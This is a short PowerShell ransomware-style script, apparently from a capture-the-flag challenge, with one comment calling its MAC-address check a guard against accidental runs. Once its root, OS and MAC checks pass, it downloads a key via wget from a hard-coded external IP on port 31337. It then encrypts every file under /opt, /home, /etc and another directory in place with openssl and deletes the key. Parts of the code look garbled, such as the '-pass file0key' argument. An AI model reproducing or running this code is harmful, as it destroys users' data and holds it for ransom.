function main {
    fun1
    fun2
    fun3
    fun4
    fun5
    exit
}

function fun1 {
    if ([int](&(Get-Command /???/id) -u) -cne -not [bool][byte]) { exit }
    if (-not ((/bin/cat /etc/*release*) | grep noble)) { exit }
    if ((/bin/cat /sys/class/net/enp0s3/address) -cne "08:00:27:eb:6b:49") { exit } # intentional guard in chal to prevent accidentally running the script
}
# openssl enc -aes-256-cbc -salt -in plain.txt -out enc
# 
# 1. Read all the contents of /etc/*release* into a variable, splits on \n
# 2. Concatenates key of line 1, line 2, key of line 3, ...
# 3. sorts and removes duplicates
# 4. result as global var

function fun2 {
    $release_contents = (/bin/cat /etc/*release*).split('\n')
    $release_aggr = (
        $release_contents[0] `
            += $release_contents[1].split('=')[0] `
            += $release_contents[2] `
            += $release_contents[3].split('=')[0] `
            += $release_contents[4].split('=')[0] `
            += $release_contents[5] `
            += $release_contents[6].split('=')[0] `
            += $release_contents[7].split('=')[0] `
            += $release_contents[8] `
            += $release_contents[9] `
            += $release_contents[10] `
            += $release_contents[11] `
            += $release_contents[12] `
            += $release_contents[13] `
            += $release_contents[14] `
            += $release_contents[15] `
            += $release_contents[16]
    ).Tochararray() + 0..9

    $release_aggr = ( -join ($release_aggr | sort-object | get-unique))
    $GLOBAL:FILE = $release_aggr
}

function fun3 {
    $KEY_URL = "35.87.165.65:31337/key"
    $KEY_FILE = "A" # 1 char
    /bin/wget $KEY_URL -q -O $KEY_FILE
}

function fun4 {
    foreach ($I in (find /opt/ -type f)) {
        openssl enc -aes-256-cbc -pass file0key -in  $I  -out  $I
    } 

    foreach ($I in (find /home/ -type f)) {
        openssl enc -aes-256-cbc -pass file0key -in  $I  -out  $I
    } 

    foreach ($I in (find /etc/ -type f)) {
        openssl enc -aes-256-cbc -pass file0key -in  $I  -out  $I
    } 

    foreach ($I in (find /vaq/ -type f)) {
        openssl enc -aes-256-cbc -pass file0key -in  $I  -out  $I 
    }
}

function fun5 {
    Remove-Item $KEY_FILE # 1 
}


main
